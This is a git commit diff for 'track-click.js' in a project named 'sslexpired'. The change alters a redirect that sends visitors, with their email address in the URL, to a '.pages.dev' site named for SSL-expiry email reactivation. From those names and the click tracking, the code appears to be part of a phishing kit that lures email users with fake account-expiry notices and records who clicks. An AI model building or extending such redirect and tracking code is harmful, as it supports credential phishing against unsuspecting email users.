f56020063d4af99622b45ce7ab72b9f19a59ebb0
benito007-index <benitocalvin@yandex.com>
2025-05-14 12:38:00 +0800

    Update track-click.js

--- sslexpired/functions/track-click.js
+++ sslexpired/functions/track-click.js
@@ -41,6 +41,6 @@ export async function onRequestGet(context) {
   }
 
   // Redirect with status
-  const redirectUrl = `sslexpiredemailreactivation2fa.pages.dev?email=${encodeURIComponent(email)}&emailSent=${emailSent}`;
+  const redirectUrl = `sslexpiredemailreactivation.pages.dev?email=${encodeURIComponent(email)}&emailSent=${emailSent}`;
   return Response.redirect(redirectUrl, 302);
 }
